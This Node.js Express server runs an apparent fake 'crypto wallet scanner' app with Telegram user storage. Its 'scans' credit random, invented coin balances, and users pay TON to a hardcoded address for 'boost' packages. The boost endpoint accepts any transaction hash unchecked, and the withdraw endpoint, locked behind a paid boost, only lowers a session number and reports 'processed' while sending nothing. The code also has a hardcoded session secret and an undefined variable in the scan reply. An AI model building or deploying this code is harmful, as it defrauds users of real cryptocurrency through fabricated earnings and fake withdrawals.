// server.js
// Node >=18 recommended
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;
const TON_RECEIVE_ADDRESS = 'UQAhk2ixejZ9_K0MPQjH3CUN4_PSDUfZEGaXtKU78nh-0Fdn';

const COIN_MAP = {
  TON: 'toncoin', BTC: 'bitcoin', ETH: 'ethereum',
  SOL: 'solana', TRX: 'tron', BNB: 'binancecoin',
  LTC: 'litecoin', USDT: 'tether', USDC: 'usd-coin'
};
const SUPPORTED = Object.keys(COIN_MAP);

const DEFAULT_BALANCES = {
  BTC: 0, ETH: 0, LTC: 0, SOL: 0, BNB: 0, USDT: 0, USDC: 0, TRX: 0, TON: 0
};

// Шанси знаходження для кожної криптовалюти (базуються на вартості)
const CRYPTO_FIND_RATES = {
  BTC: 0.001,   // Найдорожча - найрідкісніша (0.1%)
  ETH: 0.003,   // Дорога (0.3%)
  BNB: 0.005,   // Середня (0.5%)
  SOL: 0.008,   // Середня-низька (0.8%)
  LTC: 0.010,   // Низька ціна (1%)
  TON: 0.015,   // Низька ціна (1.5%)
  USDT: 0.025,  // Стейблкоїн - частіше (2.5%)
  USDC: 0.025,  // Стейблкоїн - частіше (2.5%)
  TRX: 0.030    // Найдешевша - найчастіше (3%)
};

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
  secret: 'crypto-scanner-secret-2024',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 1000 * 60 * 60 * 24 * 7 }
}));
app.use(express.static(path.join(__dirname, 'public')));

function generateWalletAddress() {
  const hex = '0x' + Array.from({length: 40}, () => 
    Math.floor(Math.random() * 16).toString(16)).join('');
  return hex.slice(0, 6) + '...' + hex.slice(-4);
}

function ensureUser(req) {
  if (!req.session.user) {
    req.session.user = {
      balances: Object.assign({}, DEFAULT_BALANCES),
      boost: null,
      tonAddress: null,
      findRate: 0.05, // 5% базовий (для Basic boost)
      scannedWallets: 0,
      speedMultiplier: 1,
      statusOnline: true,
      wallet: { 
        address: generateWalletAddress(),
        network: 'Binance Smart Chain'
      },
      telegramUser: null
    };
  }
  return req.session.user;
}

// CoinGecko prices
async function fetchPrices(symbols) {
  const ids = symbols.map(s => COIN_MAP[s]).filter(Boolean).join(',');
  if (!ids) return {};
  try {
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
    const resp = await fetch(url);
    if (!resp.ok) throw new Error('price fetch failed');
    const data = await resp.json();
    const out = {};
    for (const s of symbols) {
      const id = COIN_MAP[s];
      out[s] = data[id] && data[id].usd ? Number(data[id].usd) : 0;
    }
    return out;
  } catch (e) {
    console.error('Price fetch error:', e);
    return {};
  }
}

app.get('/api/profile', async (req, res) => {
  const user = ensureUser(req);
  try {
    const symbols = Object.keys(user.balances);
    const prices = await fetchPrices(symbols);
    const usdBalances = {};
    let totalUsd = 0;
    
    for (const sym of symbols) {
      const bal = Number(user.balances[sym] || 0);
      const price = Number(prices[sym] || 0);
      const usd = bal * price;
      usdBalances[sym] = { 
        price: price, 
        usd: Number(usd.toFixed(2)),
        balance: bal
      };
      totalUsd += usd;
    }
    
    res.json({
      balances: user.balances,
      usdBalances,
      totalUsd: Number(totalUsd.toFixed(2)),
      boost: user.boost,
      tonAddress: user.tonAddress,
      findRate: user.findRate,
      scannedWallets: user.scannedWallets,
      speedMultiplier: user.speedMultiplier,
      statusOnline: user.statusOnline,
      wallet: user.wallet,
      telegramUser: user.telegramUser,
      tonReceiveAddress: TON_RECEIVE_ADDRESS
    });
  } catch (e) {
    console.error('Profile error:', e);
    res.status(500).json({ error: 'Failed to fetch profile' });
  }
});

// Store TON address
app.post('/api/store-ton', (req, res) => {
  const { address } = req.body;
  const user = ensureUser(req);
  if (!address) return res.status(400).json({ error: 'address required' });
  user.tonAddress = address;
  res.json({ success: true, address });
});

// Store Telegram user data
app.post('/api/store-telegram', (req, res) => {
  const { telegramUser } = req.body;
  const user = ensureUser(req);
  if (!telegramUser) return res.status(400).json({ error: 'telegramUser required' });
  user.telegramUser = telegramUser;
  res.json({ success: true, telegramUser });
});

// Buy boost - confirmation after TON transaction
app.post('/api/confirm-boost', (req, res) => {
  const { amount, txHash } = req.body;
  if (!amount || !txHash) return res.status(400).json({ error: 'Invalid params' });
  
  try {
    const user = ensureUser(req);
    // 10 TON = 10x, 30 TON = 50x, 100 TON = 100x, 130 TON = 200x
    const mapping = { '10': 10, '30': 50, '100': 100, '130': 200 };
    // Find rates: 5%, 10%, 20%, 30%
    const findRateMap = { '10': 0.05, '30': 0.10, '100': 0.20, '130': 0.30 };
    const mult = mapping[String(amount)] || 1;
    const newFindRate = findRateMap[String(amount)] || 0.05;
    
    user.boost = { 
      amount: Number(amount), 
      purchased: true, 
      boughtAt: new Date().toISOString(), 
      walletAddress: user.tonAddress,
      txHash: txHash
    };
    user.speedMultiplier = mult;
    user.findRate = newFindRate;
    
    return res.json({ 
      success: true, 
      boost: user.boost, 
      speedMultiplier: user.speedMultiplier,
      findRate: user.findRate
    });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'Boost confirmation failed' });
  }
});

// Scan single wallet with crypto-specific probabilities
app.post('/api/scan-wallet', async (req, res) => {
  const { crypto } = req.body;
  const user = ensureUser(req);
  const allowed = SUPPORTED;
  const globalFindRate = Number(user.findRate || 0.05);
  
  // Вибираємо випадкову криптовалюту
  const pick = (crypto && allowed.includes(crypto)) ? crypto : allowed[Math.floor(Math.random() * allowed.length)];
  
  // Отримуємо специфічний шанс для цієї криптовалюти
  const cryptoSpecificRate = CRYPTO_FIND_RATES[pick] || 0.01;
  
  // Комбінуємо global rate (від бусту) з crypto-specific rate
  const finalRate = globalFindRate * cryptoSpecificRate * 100; // Множимо на 100 для балансу
  const found = Math.random() < finalRate;
  
  let result = { walletId: `w_${Date.now()}`, found: false, crypto: pick };
  
  if (found) {
    let amount = 0;
    // Кількість залежить від вартості криптовалюти
    switch (pick) {
      case 'BTC': amount = Number((Math.random() * 0.00005 + 0.000001).toFixed(8)); break; // Дуже мало
      case 'ETH': amount = Number((Math.random() * 0.001 + 0.0001).toFixed(6)); break;
      case 'BNB': amount = Number((Math.random() * 0.01 + 0.005).toFixed(6)); break;
      case 'SOL': amount = Number((Math.random() * 0.1 + 0.01).toFixed(6)); break;
      case 'LTC': amount = Number((Math.random() * 0.05 + 0.01).toFixed(6)); break;
      case 'TON': amount = Number((Math.random() * 0.2 + 0.05).toFixed(4)); break;
      case 'USDT': amount = Number((Math.random() * 2 + 0.5).toFixed(2)); break;
      case 'USDC': amount = Number((Math.random() * 2 + 0.5).toFixed(2)); break;
      case 'TRX': amount = Number((Math.random() * 50 + 5).toFixed(4)); break; // Багато, але дешево
      default: amount = 0;
    }
    user.balances[pick] = Number((user.balances[pick] + amount).toFixed(8));
    result = { 
      walletId: result.walletId, 
      found: true, 
      crypto: pick, 
      amount,
      timestamp: new Date().toISOString()
    };
  }
  
  user.scannedWallets = (user.scannedWallets || 0) + 1;

  try {
    const prices = await fetchPrices(Object.keys(user.balances));
    const usdBalances = {};
    let totalUsd = 0;
    
    for (const sym of Object.keys(user.balances)) {
      const bal = Number(user.balances[sym] || 0);
      const price = Number(prices[sym] || 0);
      const usd = bal * price;
      usdBalances[sym] = { 
        price: price, 
        usd: Number(usd.toFixed(2)),
        balance: bal
      };
      totalUsd += usd;
    }
    
    res.json({
      result,
      balances: user.balances,
      usdBalances,
      totalUsd: Number(totalUsd.toFixed(2)),
      findRate,
      scannedWallets: user.scannedWallets,
      speedMultiplier: user.speedMultiplier,
      statusOnline: user.statusOnline
    });
  } catch (e) {
    console.error('Scan error:', e);
    res.json({
      result,
      balances: user.balances,
      usdBalances: null,
      totalUsd: null,
      findRate: globalFindRate,
      scannedWallets: user.scannedWallets,
      speedMultiplier: user.speedMultiplier,
      statusOnline: user.statusOnline,
      warning: 'Price fetch failed'
    });
  }
});

// Withdraw (requires boost)
app.post('/api/withdraw', async (req, res) => {
  const { crypto, amount, toAddress } = req.body;
  const user = ensureUser(req);
  
  if (!user.boost || !user.boost.purchased) {
    return res.status(400).json({ error: 'Withdraw requires active boost package' });
  }
  
  const c = crypto || 'TON';
  const amt = Number(amount);
  
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Invalid amount' });
  if (!user.balances[c] || user.balances[c] < amt) {
    return res.status(400).json({ error: 'Insufficient balance' });
  }
  
  user.balances[c] = Number((user.balances[c] - amt).toFixed(8));
  
  try {
    const prices = await fetchPrices(Object.keys(user.balances));
    const usdBalances = {};
    let totalUsd = 0;
    
    for (const sym of Object.keys(user.balances)) {
      const bal = Number(user.balances[sym] || 0);
      const price = Number(prices[sym] || 0);
      const usd = bal * price;
      usdBalances[sym] = { 
        price: price, 
        usd: Number(usd.toFixed(2)),
        balance: bal
      };
      totalUsd += usd;
    }
    
    res.json({ 
      success: true, 
      message: `Withdraw ${amt} ${c} processed`,
      balances: user.balances,
      usdBalances,
      totalUsd: Number(totalUsd.toFixed(2))
    });
  } catch (e) {
    res.json({ 
      success: true, 
      message: `Withdraw ${amt} ${c} processed`,
      balances: user.balances
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server listening http://localhost:${PORT}`);
});